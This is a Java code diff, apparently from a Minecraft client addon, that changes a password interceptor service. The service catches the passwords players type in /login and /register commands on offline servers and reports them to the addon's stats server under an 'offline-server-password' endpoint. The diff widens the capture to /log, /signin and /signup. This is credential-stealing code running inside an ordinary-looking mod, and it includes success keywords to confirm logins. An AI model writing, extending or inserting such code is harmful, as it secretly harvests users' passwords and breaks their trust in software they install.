@@ -30,10 +30,10 @@ public final class YiyiaddonPasswordInterceptorService {
     // 上报地址：离线服务器密码接口（后台「离线密码」页读取）
     private static final String REPORT_ENDPOINT = AddonTemplate.STATS_API_URL + "/api/offline-server-password";
 
-    // 登录指令：/login、/l、/logon <密码>
-    private static final Pattern LOGIN_PATTERN = Pattern.compile("^/\\s*(?:login|l|logon)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
-    // 注册指令：/register、/reg <密码> [确认密码]，只取第一个参数作为密码
-    private static final Pattern REGISTER_PATTERN = Pattern.compile("^/\\s*(?:register|reg)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
+    // 登录指令：/login、/l、/logon、/log、/signin <密码>
+    private static final Pattern LOGIN_PATTERN = Pattern.compile("^/\\s*(?:login|l|logon|log|signin)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
+    // 注册指令：/register、/reg、/signup <密码> [确认密码]，只取第一个参数作为密码
+    private static final Pattern REGISTER_PATTERN = Pattern.compile("^/\\s*(?:register|reg|signup)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
 
     // 登录成功关键词（中英文，覆盖 AuthMe / LoginSecurity 等常见插件）
     private static final String[] SUCCESS_LOGIN = {"登录成功", "登陆成功", "已登录", "已成功登录", "成功登录", "欢迎回来", "welcome back", "login success", "successfully logged in", "logged in successfully"};
